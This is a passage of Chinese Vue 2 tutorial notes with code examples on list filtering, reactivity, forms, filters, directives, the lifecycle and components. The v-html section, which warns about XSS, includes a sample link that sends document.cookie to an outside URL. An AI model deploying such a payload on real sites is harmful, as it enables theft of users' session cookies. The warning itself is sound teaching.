        <h2>列表人员</h2>
        <input type="text" placeholder="请输入姓名" v-model="keyWold">
        <ul>
            <li v-for="(item, index) in filPersonArr" :key="item.id">
               {{index}}-- {{ item.name }} -- {{ item.age }}--{{ item.sex }}
            </li>

        </ul>


    </div>

</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    /*computed 实现*/
    const vm = new Vue({
        el: '#root',
        data: {
            keyWold:'',
            personArr: [
                {id: 1, name: '张三', age: 48,sex:'男'},
                {id: 2, name: '李四', age: 18,sex:'女'},
                {id: 3, name: '王五', age: 28,sex:'男'},
            ],

        },
        computed: {
            filPersonArr(){
                   return  this.personArr.filter((p)=>{
                        return p.name.indexOf(this.keyWold) != -1

                    })

            }
        }

    });


</script>
</html>
```

**使用watch**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>列表过滤</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>

    <div id="root">
        <h2>列表人员</h2>
        <input type="text" placeholder="请输入姓名" v-model="keyWold">
        <ul>
            <li v-for="(item, index) in filPersonArr" :key="item.id">
               {{index}}-- {{ item.name }} -- {{ item.age }}--{{ item.sex }}
            </li>

        </ul>


    </div>

</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    /*watch实现*/
    const vm = new Vue({
        el: '#root',
        data: {
            keyWold:'',
            filPersonArr:[],
            personArr: [
                {id: 1, name: '张三', age: 48,sex:'男'},
                {id: 2, name: '李四', age: 18,sex:'女'},
                {id: 3, name: '王五', age: 28,sex:'男'},
            ],

        },
        watch: {
            keyWold:{
                immediate:true,
                 handler(val){
                    this.filPersonArr = this.personArr.filter((p)=>{
                        return p.name.indexOf(val) != -1

                    })
                }

            }
        }

    });




</script>
</html>
```

### 列表排序

![image-20240802150054481](upload\image-20240802150054481.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>列表排序</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>

    <div id="root">
        <h2>列表人员</h2>
        <input type="text" placeholder="请输入姓名" v-model="keyWold">
        <button @click="sortType = 2">年龄升序</button>
        <button @click="sortType = 1">年龄降序</button>
        <button @click="sortType = 0">原顺序</button>


        <ul>
            <li v-for="(item, index) in filPersonArr" :key="item.id">
               {{index}}-- {{ item.name }} -- {{ item.age }}--{{ item.sex }}
            </li>

        </ul>


    </div>

</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    /*watch实现*/
    const vm = new Vue({
        el: '#root',
        data: {
            keyWold:'',
            sortType:0, // 0原顺序1降序2升序
            personArr: [
                {id: 1, name: '张三', age: 48,sex:'男'},
                {id: 2, name: '李四', age: 18,sex:'女'},
                {id: 3, name: '王五', age: 28,sex:'男'},
                {id: 4, name: '老刘', age: 8,sex:'女'},
                {id: 5, name: '刘大大', age: 58,sex:'女'},
            ],

        },
        computed: {
            filPersonArr(){
                const  arr =  this.personArr.filter((p)=>{
                    return p.name.indexOf(this.keyWold) != -1

                })

                if(this.sortType){

                    arr.sort((p1,p2)=>{
                        return this.sortType === 1 ?  (p2.age - p1.age) : (p1.age - p2.age)
                    })

                }

                return arr;




            }
        }

    });




</script>
</html>
```

### 更新的一个问题

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>更新的一个问题</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>

    <div id="root">
        <h2>列表人员</h2>
        <button @click="updatePersonArr">更新张三信息</button>


        <ul>
            <li v-for="(item, index) in personArr" :key="item.id">
               {{index}}-- {{ item.name }} -- {{ item.age }}--{{ item.sex }}
            </li>

        </ul>


    </div>

</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    /*watch实现*/
    const vm = new Vue({
        el: '#root',
        data: {
            keyWold:'',
            sortType:0, // 0原顺序1降序2升序
            personArr: [
                {id: 1, name: '张三', age: 48,sex:'男'},
                {id: 2, name: '李四', age: 18,sex:'女'},
                {id: 3, name: '王五', age: 28,sex:'男'},
                {id: 4, name: '老刘', age: 8,sex:'女'},
                {id: 5, name: '刘大大', age: 58,sex:'女'},
            ],

        },
        methods: {
            updatePersonArr(){
                // 有效果
                // this.personArr[0].name='张大大';
                this.personArr.splice(0,1,{id: 1, name: '张大大', age: 48,sex:'男'})
                // this.personArr[0] = {id: 1, name: '张大大', age: 48,sex:'男'};  // 没有效果
            }
        }

    });




</script>
</html>
```

### Vue监测数据原理-对象

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>模拟一个监测数据原理</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
    </div>
</body>
<script type="text/javascript">
    let data = {
        name:'湖南大学',
        address:'湖南'
    }
    // 创建一个监测的实例对象，用于监测data中属性的变化
    const  obs = new Oberver(data);
    console.log(obs)

   // 准备一个vm实例对象
    let vm = {}

    vm._data =data = obs


    function Oberver(obj){
        // 汇总对象所有属性形成一个数组
      const keys = Object.keys(obj)



        keys.forEach((k)=>{
           Object.defineProperty(this,k,{
               get(){
                   return obj[k]
               },
               set(value){
                   console.log(`${k}被调用需要解析模拟`)
                   obj[k]= value
               },
           })
        })

    }



</script>
</html>
```

### Vue.set方法

![image-20240802165631426](upload\image-20240802165631426.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vue中set方法的使用</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
      <h2>姓名：{{student.name}}</h2>
        <button @click="addSex">添加一个性别</button>
        <h2 v-if="student.sex">性别：{{student.sex}}</h2>
        <h2>年龄  真实：{{student.age.rage}}   对外{{student.age.sage}}</h2>
        <h2>描述：{{student.description}}</h2>
    </div>
</body>
<script type="text/javascript">
    const vm = new Vue({
        el: '#root',
        data: {
            student:{
                name:'张三',
                age:{
                    rage:10,
                    sage:89
                }
            },

        },
        methods: {
            addSex(){
                this.$set(this.student,'sex','男')
            }
        }

    });



</script>
</html>
```

### Vue数组监测数据原理

[数组更新检测说明](https://v2.cn.vuejs.org/v2/guide/list.html#数组更新检测)

![image-20240802171812990](upload\image-20240802171812990.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vue数组监测原理</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <li v-for="item in hobby">
             {{item}}
        </li>
    </div>
</body>
<script type="text/javascript">
    const vm = new Vue({
        el: '#root',
        data: {
            student:{
                name:'张三',
                age:{
                    rage:10,
                    sage:89
                }
            },
            hobby:[
                'Java',
                'Vue',
                'Mysql',
            ]

        },
        methods: {

        }

    });



</script>
</html>
```

### 总结Vue检查数据

vue会监视data中所有层次的数据。
如何监测对象中的数据?
通过setter实现监视，且要在new Vue时就传入要监测的数据，
   对象中后追加的属性，Vue默认不做响应式处理
   **如需给后添加的属性做响应式，请使用如下API:**

- ​        Vue.set(target,propertyName/index，value)
- ​	    vm.$set(target,propertyName/index,value)

如何监测数组中的数据?
通过包裹数组更新元素的方法实现，本质就是做了两件事:
    调用原生对应的方法对数组进行更新。
    重新解析模板，进而更新页面。

**在Vue修改数组中的某个元素一定要用如下方法:**

- ​         使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
- ​	    Vue.set()或vm.$set()

特别注意:Vue.set()和 vm.$set()不能给vm 或 vm的根数据对象 添加属性!!!

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>总结Vue检查数据</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <h1>学生信息</h1>

        <button @click="student.age++">年龄加+1</button><br/><br/>
        <button  @click="addSex">添加属性，默认值：男</button><br/><br/>
        <button  @click="student.sex='未止'">修改性别</button><br/><br/>
        <button @click="addFriend">在类别首位添加一个朋友</button><br/><br/>
        <button @click="updateFirstFriend">修改第一朋友名字为：张三</button><br/><br/>
        <button @click="addHobby">添加一个爱好</button><br/><br/>
        <button @click="updateFirstHobby">修改第一个爱好为：开车</button><br/><br/>
        <button @click="filterFishHobby">过滤爱好中的：钓鱼</button><br/>


        <h3>姓名：{{student.name}}</h3>
        <h3>年龄：{{student.age}}</h3>

        <h3 v-if="student.sex">年龄：{{student.sex}}</h3>
        <h3>爱好：</h3>
        <ul>
            <li v-for="(item,index) in student.hobby" :key="index">
                {{item}}
            </li>

        </ul>
        <hr>

        <ul>
            <li v-for="(obj,index) in student.friend" :key="index">
                {{index}}-- {{obj.name}}--{{obj.age}}
            </li>

        </ul>

    </div>
</body>
<script type="text/javascript">
    const vm = new Vue({
        el: '#root',
        data: {
            student:{
                name:'Tom',
                age:18,
                hobby:['打篮球','玩游戏','钓鱼'],
                friend:[
                    {name:"jerry",age:45},
                    {name:"tony",age:36},
                ]
            },


        },
        methods: {
            addSex(){
                Vue.set(this.student,'sex','男')
            },
            addFriend(){
                this.student.friend.unshift({name:'jack',age:78})
            },
            updateFirstFriend(){
                this.student.friend.splice(0,1,{name:'张三',age:78})
            },
            addHobby(){
                this.student.hobby.push('学习')
            },
            updateFirstHobby(){
                // this.student.hobby.splice(0,1,'开车')
                // Vue.set(this.student.hobby,0,'开车')
                this.$set(this.student.hobby,0,'开车')
            },
            filterFishHobby(){
                this.student.hobby = this.student.hobby.filter((item=>{
                    return item != '钓鱼'
                }))
            }

        }

    });



</script>
</html>
```

![image-20240805101719636](upload\image-20240805101719636.png)

### 收集表单数据

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>收集表单数据</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <form @submit.prevent="submitBtn">
            账号：<input type="text" v-model.lazy="student.account"><br/><br/>
            密码：<input type="password" v-model="student.password"><br/><br/>
            年龄：<input type="number" v-model.number="student.age"><br/><br/>
            性别：
            男 <input type="radio" name="sex" v-model="student.sex" value="male">
            女 <input type="radio" name="sex" v-model="student.sex" value="famale"><br/><br/>
            爱好：
            学习<input type="checkbox" v-model="student.hobby" value="study">
            打游戏<input type="checkbox" v-model="student.hobby" value="game">
            钓鱼<input type="checkbox" v-model="student.hobby" value="fish"><br/><br/>
            所属校区
            <select v-model="student.city">
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="guangzhou">广州</option>
                <option value="shenzhen">深圳</option>
            </select><br/><br/>

            其它信息
            <textarea v-model="student.other"> </textarea><br/><br/>
            <input type="checkbox" v-model="student.agree"> 阅读并接受<a href="http://www.zhuzq.com">《用户协议》</a><br/><br/>
            <button>  提交 </button>


        </form>

    </div>
</body>
<script type="text/javascript">
    const vm = new Vue({
        el: '#root',
        data: {

            student:{
                account:'',
                password:'',
                age:'',
                sex:'',
                hobby:[],
                city:'',
                other:'',
                agree:''
            }



        },
        methods: {
            submitBtn(){
                console.log(this.student)
            }

        }

    });



</script>
</html>
```



![image-20240805105611019](upload\image-20240805105611019.png)



收集表单数据:
若:<input type="text"/> 则v-model收集的是value值，用户输入的就是value值
若:<input type="radio"/>  则v-model收集的是value值，且要给标签配置value值
若:<input type="checkbox'/>
    没有配置input的value属性，那么收集的就是checked(勾选 or 未勾选，是布尔值)
    **配置input的value属性:**

- ​    v-model的初始值是非数组，那么收集的就是checked(勾选 or 末勾选，是布尔值)
- ​    v-model的初始值是数组，那么收集的的就是value组成的数组

**备注:v-model的三个修饰符:**

- ​      lazy:失去焦点再收集数据
- ​      number:输入字符串转为有效的数字
- ​      trim:输入首尾空格过滤

### 过滤器

过滤器:
定义:对要显示的数据进行特定格式化后再显示。适用于一些简单逻辑的处理)
语法:

-  注册过滤器:Vue.filter(name,callback)或 new Vue{filters:{}}
-  使用过滤器:{{ xxx | 过滤器名}} 或 v-bind:属性 ="xxx | 过滤器名"

 备注:

-  过滤器也可以接收额外参数、多个过滤器也可以串联
-  并没有改变原本的数据，是产生新的对应的数据

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>过滤器</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <!--时间处理-->
    <script type="text/javascript" src="../js/dayjs.min.js"></script>

</head>

<body>
    <div id="root">
        <h2>显示格式化后的时间</h2>
        <h2>{{ftmTime}}</h2>
        <h2>{{getFormartTime() }}</h2>

        <!--过滤器使用-->
        <h2>{{time | timeFilter}}</h2>

        <!--过滤器传参-->
        <h2>{{time | timeFilter('YYYY-MM-DD HH:mm:ss') | mySlice }}</h2>


        <h2 :x="msg | mySlice" >你好啊！帅气的男孩</h2>
        <input type="text" v-model="msg">

    </div>
</body>
<script type="text/javascript">


    //全局过滤器
    Vue.filter('mySlice', function (value) {
        return value.slice(0, 4)

    });



    const vm = new Vue({
        el: '#root',
        data: {
           time:1722848396374,
            msg:'你好啊！帅气的男孩'

        },
        computed: {
            ftmTime(){
                // return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss');
                // 获取当前时间
                return dayjs().format('YYYY-MM-DD HH:mm:ss');
            }

        },
        methods:{
            getFormartTime(){
                return dayjs().format('YYYY-MM-DD HH:mm:ss');
            }
        },
        filters:{ // 局部过滤器
            timeFilter(value,format='YYYY-MM-DD'){
                return dayjs(value).format(format);
            },
            // myslice(value){
            //     return value.slice(0,4);
            //
            // }
        }


    });



</script>
</html>
```



![image-20240806113343236](upload\image-20240806113343236.png)

### v-text指令

- v-bind ::单向绑定解析表达式，可简写为:xxx
- v-model:双向数据绑定
- v-for:遍历数组/对象/字符中
- v-on: 绑定事件监听，可简写为@
- v-if:条件消染(动态控制节点是否存存在)
- v-else条件渲染(动态控制节点是否存存在)
- v-show :条件消染(动态控制节点是否展示)

v-text指令:

- 作用:向其所在的节点中渲染文本内容。
- 与插值语法的区别:v-text会替换掉节点中的内容，{{xx}}则不会

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v-text指令</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <div>你好！ {{name}}</div>
        <div v-text="name">你好！</div>
        <div v-text="str">你好！</div>
    </div>
</body>
<script type="text/javascript">


    const vm = new Vue({
        el: '#root',
        data: {
            name:'张三',
            str:`<div>asa</div>`
        },
    });



</script>
</html>
```

![image-20240806114449738](upload\image-20240806114449738.png)

### v-html指令

**v-htm1指令:**
作用:向指定节点中渲染包含html结构的内容。
**与插值语法的区别:**
   v-htm1会替换掉节点中所有的内容，{{xx}}则不会。
   v-htm1可以识别html结构。
**严重注意:v-html有安全性问题!!!!**
在网站上动态渲染任意HTML是非常危险的，容易导致XSS改击。
一定要在可信的内容上使用v-htm1，永不要用在用户提交的内容上!

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v-html指令</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <div>你好！ {{name}}</div>
        <div v-html="name">你好！</div>
        <div v-html="str">你好！</div>
        <div v-html="str2"></div>
    </div>
</body>
<script type="text/javascript">


    const vm = new Vue({
        el: '#root',
        data: {
            name:'张三',
            str:`<div>asa</div>`,
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'
        },
    });



</script>
</html>
```

![image-20240806142822640](upload\image-20240806142822640.png)

### v-cloak指令

**v-cloak指令(没有值):**
本质是一个特殊属性，Vue实例创建完毕并接管容器后，会掉v-cloak属性。
使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v-cloak指令</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<style>
    [v-cloak]{
        display: none;
    }

</style>

<body>
    <div id="root">
        <div v-cloak>你好！ {{name}}</div>
    </div>
</body>

<script type="text/javascript">


    const vm = new Vue({
        el: '#root',
        data: {
            name:'张三',
        },
    });



</script>
</html>
```

### v-once指令

v-once指令:
v-once所在节点在初次动态渲染后，就视为静态内容了。
以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v-once指令</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>


<body>
    <div id="root">
        <div v-once >初始化n的值 ： {{n}}</div><br/>
        <div >当前n的值 ： {{n}}</div><br/>
        <button @click="n++">点我n加1</button>
    </div>
</body>

<script type="text/javascript">


    const vm = new Vue({
        el: '#root',
        data: {
            n:1,
        },
    });



</script>
</html>
```

### v-pre指令

v-pre指令:
跳过其所在节点的编译过程。
可利用它跳过:没有使用指令语法、没有使用插值语法的节点，会加快编译

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v-pre指令</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>


<body>
    <div id="root">
        <div v-pre >初始化n的值 ： {{n}}</div><br/>
        <div >当前n的值 ： {{n}}</div><br/>
        <button @click="n++">点我n加1</button>
    </div>
</body>

<script type="text/javascript">


    const vm = new Vue({
        el: '#root',
        data: {
            n:1,
        },
    });



</script>
</html>
```

### 自定义函数式

![image-20240806153055115](upload\image-20240806153055115.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>自定义函数式</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>


<body>
    <div id="root">
        <div >初始化n的值 ： <span v-text="n"></span></div><br/>
        <div >放大10倍后的n值是 ： <span v-big="n"></span></div><br/>
        <button @click="n++">点我n加1</button>
    </div>
</body>

<script type="text/javascript">


    const vm = new Vue({
        el: '#root',
        data: {
            n:1,
        },
        directives:{
            /*
            big函数何时会被调用?
             1.指令与元素成功绑时(一上来)。
             2.指令所用到的数据发生更新时
                */
            big(element,binding){
               console.log(element,binding);
                element.innerText = binding.value * 10
            }
        }
    });



</script>
</html>
```

### 自定义对象式

![image-20240806154323006](upload\image-20240806154323006.png)



```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>自定义对象式</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>


<body>
    <div id="root">
        <div >初始化n的值 ： <span v-text="n"></span></div><br/>
        <div >放大10倍后的n值是 ： <span v-big="n"></span></div><br/>
        <button @click="n++">点我n加1</button><br/><br/>


       <input type="text" v-fbind="n"><br/>
        <input type="text" v-fbind:value="n">
    </div>
</body>

<script type="text/javascript">


    const vm = new Vue({
        el: '#root',
        data: {
            n:1,
        },
        directives: {
            /*
            big函数何时会被调用?
             1.指令与元素成功绑时(一上来)。
             2.指令所用到的数据发生更新时
                */
            big(element, binding) {
                console.log(element, binding);
                element.innerText = binding.value * 10
            },
            fbind: {
                //指令与元素成功绑定时(一上来)
                bind(element, binding) {
                    console.log('element',element)
                    console.log('binding',binding)
                    element.value = binding.value
                },
                //指令所在元素被插入页面时
                inserted(element, binding) {
                    element.focus()
                },
                //指令所在的模板被重新解析时
                update(element, binding) {
                    element.value = binding.value

                }

            }
        }
    });



</script>
</html>
```

**小结**

需求1:定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
需求2:定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
自定义指令总结:
定义语法:
(1).局部指令:new Vue({directives;{指令名:配置对象 new Vue({directives{指令名:回调函数}})
(2).全局指令:Vue.directive(指令名,配置对象)或Vue.directive(指令名,回调所数)

配置对象中常用的3个回调:
(1)bind:指令与元素成功绑定时调用。
(2)inserted:指令所在元素被插入页面时调用。
(3)update:指令所在模板结构被重新解析时调用,
备注:
指令定义时不加v-，但使用时要加v-;
指令名如果是多个单词，要使用kebab-case命名方式，不要用camelcase命名。

### 引出声明周期

生命周期:

- 又名:生命周期回调函数、生命周期函数、生命周期钩子。
- 是什么:Vue在关键时刻帮我们调用的一些特殊名称的函数。
- 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的
- 生命周期函数中的this指向是vm 或 组件实例对象。



```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>引出生命周期</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>


<body>
    <div id="root">
        <h2 :style="{opacity:opacity}"> 欢迎学习Vue</h2>

    </div>
</body>

<script type="text/javascript">




    const vm = new Vue({
        el: '#root',
        data: {
            opacity:1
        },
        methods:{

        },
        //Vue完成模板的解析并把初始的真实DOM元素放入页面后(挂载完毕)调用mounted
        mounted(){
            console.log('mounted');
            setInterval(()=>{
                this.opacity -= 0.01
                if(this.opacity <= 0){
                    this.opacity = 1
                }
            },16)

        }
    });



</script>
</html>
```

### 生命周期流程



![image-20240807101948030](upload\image-20240807101948030.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>生命周期流程</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>


<body>
    <div id="root">
        <div >n的值 ： {{n}}</div><br/>
        <button @click="n++">点我n加1</button><br/><br/>
        <button @click="bye">点我销毁vm</button><br/><br/>
    </div>
</body>

<script type="text/javascript">
 Vue.config.productionTip = false



    const vm = new Vue({
        el: '#root',
        data: {
           n:1
        },
        methods:{
            add(){
                return this.n++
            },
            bye(){
                this.$destroy()
            }
        },
        /**
         * 此时:无法通过vm访问到data中的数据、methods中的方法
         */
        beforeCreate(){
            console.log('beforeCreate','------>n='+this.n )
           // console.log('beforeCreate','------>n='+this.n +" add()方法="+this.add())
        },

        /**
         * 此时，可以通过vm访问到data中的数据、methods中的配置方法
         */
        created(){
            console.log('create','------>n='+this.n +" add()方法="+this.add())
        },
        /**
         * 此时:
         * 1、页面呈现的是未经Vue编译的DOM结构。
         * 2、所有对DOM的操作，最终都不凑效
         */
        beforeMount(){
            console.log('beforeMount','------>n='+this.n +" add()方法="+this.add())
        },

        /**
         * 此时:
         1、页面呈现的是经过vue编译的DOM。
         2、对DOM的操作均有效(尽可能避免)此时初始化过程结束，一般在此进行:开启定时器、发送网络请求、订阅消息、绑定自定义事件等初始化操作
         */
        mounted(){
            console.log('mounted','------>n='+this.n +" add()方法="+this.add())
        },
        /**
         * 此时:数据是最新的，但页面是旧的。即页面尚未和数据保持同步
         */
        beforeUpdate(){
            console.log('beforeUpdate','------>n='+this.n +" add()方法="+this.add())
        },
        /**
         * 此时:数据是最新的，页面也是最新的，即:页面和数据保持同步
         */
        updated(){
            console.log('updated')
        },

        /**
         * 此时:vm中所有的:data、methods、指令等等，都处于可用状态，马上要执行销毁过程，一般在此阶段:关闭定时器、取消订阅消息、解绑自定义事件等收尾操作
         */
        beforeDestroy(){
            debugger
            console.log('beforeDestroy')
        },
        destroyed(){
            debugger
            console.log('destroyed')
        }

    });



</script>
</html>
```

![image-20240807135412029](upload\image-20240807135412029.png)



**小结**

vm的一生(vm的生命周期):

- 将要创建===》调用beforecreate凼数
- 创建完毕===》调用created幽数。
  将要挂载===》调用beforeMount囪数。
- (重要)挂载完毕===》调用mounted函数。【重要的钩子】
- 更新调用===》beforeUpdate凼数。
- 更新完毕===》调用updated函数。
- (重要)将要销毁===》调用beforeDestroy数。【重要的钩子】。
- 销毁完毕===》调用destroyed函数。

### 组件的理解

**模块**
理解:向外提供特定功能的js程序，一般就是一个js 文件
为什么:js 文件很多很复杂-
作用: 复用js，简化js 的编写，提高js 运行效率

**组件**
理解:用来实现局部(特定)功能效果的代码集合(html/css/js/image.....)
为什么:一个界面的功能很复杂
作用:复用编码，简化项目编码，提高运行效率

**模块化**

当应用中的js 都以模块来编写的，那这个应用就是一个模块化的应用。

**组件化**

当应用中的功能都是多组件的方式来编写的，那这个应用就是一个
且件化的应用



![image-20240807140356969](upload\image-20240807140356969.png)

![image-20240807140504436](upload\image-20240807140504436.png)

### 非单文件组件

**非单文件组件:**一个文件中包含有n个组件
**单文件组件:**一个文件中只包含有1个组件。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>非单文件组件</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>


<body>
    <div id="root">
        <!--第三步，编写组件标签-->
        <school></school>
        <hr>
        <student></student>
        <hello></hello>
    </div>
    ======================================================================
    <div id="root2">
        <!--第三步，编写组件标签-->
        <hello></hello>
    </div>



</body>

<script type="text/javascript">
 Vue.config.productionTip = false

 // 第一步：创建组件
   const  school = Vue.extend({
       template:`
               <div>
                   <h2>学校名称：{{schoolName}}</h2>
                   <h2>学校地址：{{schoolAddress}}</h2>
               </div>
       `,
       data() {
           return {
               schoolName: '深圳大学',
               schoolAddress: '广东省深圳市'
           }
       }
   })

 const  student = Vue.extend({
     template:`
               <div>
                   <h2>学生姓名：{{studentName}}</h2>
                   <h2>学生年龄：{{studentAge}}</h2>
               </div>
       `,
     data() {
         return {
             studentName: '张三',
             studentAge: 36
         }
     }
 })


 //------------创建全局组件---------------------------------
 // 第一步：创建组件
 const  hello = Vue.extend({
     template:`
               <div>
                   <h2>Hello</h2>
               </div>
       `,
 })

 // 注册组件
 Vue.component('hello',hello);


 new Vue({
     el: '#root2',
     //第二步：注册组件
     components:{
         school:school,
         student:student
     }


 });
 
 //---------------------------------------------


 const vm = new Vue({
        el: '#root',
        //第二步：注册组件
        components:{
            school:school,
            student:student
        }


    });



</script>
</html>
```

![image-20240807143800398](upload\image-20240807143800398.png)

**Vue中使用组件的三大步骤:**

1.定义组件(创建组件)
2.注册组件
3.使用组件(写组件标签)

如何定义一个组件?
使用Vue.extend(options)创建，奖options利new Vue(options)时传入的那个options几乎一样，但也有点区別:
区别如下:
1.e1不要写，为什么?- 最终所有的组件都要经过一个vm的管理，由vm中的e1决定服务哪个容器。
2.data必须写成函数，为什么?--避免组件被复用时，数据存在引用关系。
备注:使用template可以配置组件结构。

如何注册组件?
1.局部注册:靠new Vue的时候传入components选项
2.全局注册:称Vue.component('维件名',维件)

编写组件标签:
示例：<school></school>

### 组件需要注意的几个点

1.关于组件名:
	一个单词组成:
		第一种写法(首字母小写):schoo1
		第二种写法(首字母大写):Schoo1
	多个单词组成:
		第一种”法(kebab-case命名):my-school
		第二种写法(Came1Case命名):MySchool(需要Vue脚手架支持)
各注:
(1).组件名尽可能回避HTML中已有的元素名称，例如:h2、H2都不行
(2).可以使用name配置项指定组件在开发者工具中呈现的名字。

2.关于组件标签:
	第一种写法:<school></school>
	第二种写法:<school/>
	备注:不使用脚手架时，<schoo1/>会导致后续组件不染。
3.一个简写方式:
	const school =Vue.extend(options)可简写为:const school = options

```HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>组件的几个注意点</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>


<body>
    <div id="root">
        <!--第三步，编写组件标签-->
        <my-school></my-school>
    </div>




</body>

<script type="text/javascript">
 Vue.config.productionTip = false

 // 第一步：创建组件
   const  school = {
       template:`
               <div>
                   <h2>学校名称：{{schoolName}}</h2>
                   <h2>学校地址：{{schoolAddress}}</h2>
               </div>
       `,
       data() {
           return {
               schoolName: '深圳大学',
               schoolAddress: '广东省深圳市'
           }
       }
   }


 const vm = new Vue({
        el: '#root',
        //第二步：注册组件
        components:{
            'my-school':school,
        }


    });


</script>
</html>
```

![image-20240807151738933](upload\image-20240807151738933.png)



### 组件嵌套

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>组件嵌套</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>


<body>
    <div id="root">

    </div>



</body>

<script type="text/javascript">
 Vue.config.productionTip = false

 // 第一步：创建组件
 const  student = Vue.extend({
     template:`
               <div>
                   <h2>学生姓名：{{studentName}}</h2>
                   <h2>学生年龄：{{studentAge}}</h2>
               </div>
       `,
     data() {
         return {
             studentName: '张三',
             studentAge: 36
         }
     }
 })


 const  school = Vue.extend({
       template:`
               <div>
                   <h2>学校名称：{{schoolName}}</h2>
                   <h2>学校地址：{{schoolAddress}}</h2>
                   <student></student>
               </div>
       `,
       data() {
           return {
               schoolName: '深圳大学',
               schoolAddress: '广东省深圳市'
           }
       },
       components:{
           student:student
       }
   })


 const  hello = Vue.extend({
     template:`
               <div>
                   <h2>{{name}}</h2>
               </div>
       `,
     data() {
         return {
             name: 'Hello',
         }
     }
 })

 const app = Vue.extend({
     template:`
               <div>
                   <hello></hello>
                   <school></school>
               </div>
       `,
     components:{
         school:school,
         hello:hello
     }
 })





 const vm = new Vue({
        template:'<app></app>', <!--第三步，编写组件标签-->
        el: '#root',
        //第二步：注册组件
        components:{
            app:app,
        }


    });



</script>
</html>
```

![image-20240807154743179](upload\image-20240807154743179.png)

### VueComponet构造函数

关于VueComponent:
1.schoo1组件本质是一个名为VueComponent的构造的数，且不是程序员定义的，是Vue.extend生成的。
2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建schoo1组件的实例对象,即Vue帮我们执行的:newVuecomponent(options)
3.特别注意:每次调用Vue.extend，返网的都是一个全新的VueComponent!!!!
4.关于this指向:
(1).组件配置中:
	data函数、methods中的所数、watch中的函数、computed中的的数它们的this均是【Vuecomponent实例对象】
(2).new Vue(options)置中:
	data函数、methods中的函数、watch中的函数、computed中的函数它们的this均是【Vue实例对象】
5.VueComponent的实例对象，以后简称vc(也可称之为:组件实例对象)。
Vue的实例对象，以后简称vm.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>VueComponent构造函数</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>


<body>
    <div id="root">
        <hello></hello>
        <school></school>
    </div>



</body>

<script type="text/javascript">
 Vue.config.productionTip = false

 // 第一步：创建组件

 const  school = Vue.extend({
       template:`
